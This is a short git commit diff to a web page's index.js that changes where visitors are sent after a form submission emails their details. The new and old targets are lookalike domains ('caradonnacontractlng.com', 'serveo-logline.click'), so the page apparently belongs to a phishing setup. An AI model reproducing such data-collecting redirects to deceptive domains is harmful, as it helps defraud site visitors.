02317f2ecaa4a4884c4a068800642ce51b50d5f2
husknet <127146284+husknet@users.noreply.github.com>
2024-10-17 12:33:45 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tobeopen.serveo-logline.click';
+        window.location.href = 'https://tb.caradonnacontractlng.com';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
